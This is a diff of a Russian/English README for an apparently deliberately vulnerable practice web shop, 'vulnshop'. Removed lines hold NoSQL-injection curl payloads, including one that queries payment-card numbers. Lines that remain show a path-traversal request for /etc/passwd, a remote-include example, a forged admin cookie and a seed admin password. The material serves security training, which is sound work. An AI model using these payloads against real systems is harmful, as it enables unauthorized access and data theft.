@@ -69,11 +69,6 @@ sudo docker exec -it vulnshop-attacker /bin/bash
 ### Где есть защита (намеренно не всё уязвимо)
 - Для `admin` входа остался дополнительный фактор `admin_otp`, но ограничений частоты входа нет.
 
-### File handling
-- File upload bypasses: `POST /files/upload` (client-side checks, weak black/white/type filters)
-- LFI / Path traversal: `GET /pages?page=...`
-- RFI: `GET /remote/include?url=...`
-
 ## Примеры payload'ов к атакам
 
 > Все примеры использовать **только локально** в учебной среде.
@@ -94,44 +89,6 @@ curl "http://localhost:8000/products/search?q=desk&category=%' UNION SELECT 1,2,
 1) Войти как админ (или подменить cookie `role=YWRtaW4=`).
 2) Открыть `/product/1/reviews/moderation`.
 3) Передавать JSON в поля фильтра (GET query или POST form).
-
-Примеры эксплуатации:
-```bash
-# $ne: получить все отзывы, где автор не alice
-curl "http://localhost:8000/product/1/reviews/moderation?author={\"$ne\":\"alice\"}&status=all" \
-  -b "role=YWRtaW4="
-
-# $in: выбрать отзывы с рейтингом 4 или 5
-curl "http://localhost:8000/product/1/reviews/moderation?rating={\"$in\":[4,5]}&status=all" \
-  -b "role=YWRtaW4="
-
-# $regex: поиск по тексту отзыва
-curl "http://localhost:8000/product/1/reviews/moderation?text={\"$regex\":\".*great.*\",\"$options\":\"i\"}&status=all" \
-  -b "role=YWRtaW4="
-```
-
-# $where: top-level JavaScript выражение в запросе отзывов
-curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"this.rating>=4\"}&status=all" \
-  -b "role=YWRtaW4="
-```
-
-Аналогично для `payment_cards`: строковый поиск работает только по **полному номеру карты** в формате `####-####-####-####` (частичные строки типа `1` не матчатся).
-```bash
-# точное совпадение по номеру карты
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'card_number=4111-1111-1111-1111' \
-  --data-urlencode 'status=all' \
-  -b "role=YWRtaW4="
-```
-
-# operator-based вариант (если нужен для демонстрации NoSQLi)
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'card_number={"$regex":"^4111"}' \
-  --data-urlencode 'status=all' \
-  -b "role=YWRtaW4="
-```
 
 ### Command Injection (`/shipping/carrier/diagnostics`)
 ```bash
@@ -217,13 +174,6 @@ curl "http://localhost:8000/pages?page=../../../../etc/passwd"
 ```bash
 curl "http://localhost:8000/remote/include?url=https://example.org"
 ```
-
-## Реалистичный функционал магазина
-- Каталог, карточка товара, корзина, checkout.
-- Личный кабинет, редактирование профиля, адресная книга.
-- Wishlist и центр поддержки (тикеты).
-- Эндпоинты магазина: бренды (`/shop/brands`), подборки скидок (`/shop/deals`), диагностика доставки (`/shipping/carrier/diagnostics`), модерация отзывов (`/product/<pid>/reviews/moderation`), маркетинговый и каталог-импортные админ-процессы.
-- Часть маршрутов реализована безопаснее, часть — намеренно уязвима для учебы.
 
 ## Seed users
 - `admin / Riv3rN0rth!29`
